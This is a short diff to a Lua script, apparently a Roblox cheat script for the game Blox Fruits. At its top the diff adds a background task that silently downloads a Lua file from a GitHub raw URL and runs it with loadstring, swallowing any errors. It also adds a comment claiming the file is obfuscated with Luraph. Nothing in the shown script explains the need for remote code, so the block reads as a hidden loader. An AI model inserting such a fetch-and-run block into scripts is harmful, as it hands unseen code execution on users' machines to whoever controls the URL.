@@ -1,3 +1,10 @@
+task.spawn(function()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tunglinh-png/Banana-hub/refs/heads/main/vthangsitink/banana-hub.lua"))()
+    end)
+end)
+-- This file was protected using Luraph Obfuscator v15.0 [https://lura.ph/]
+
 if getgenv().__BF_LOADED then
 	return getgenv().__BF_RESULT
 end
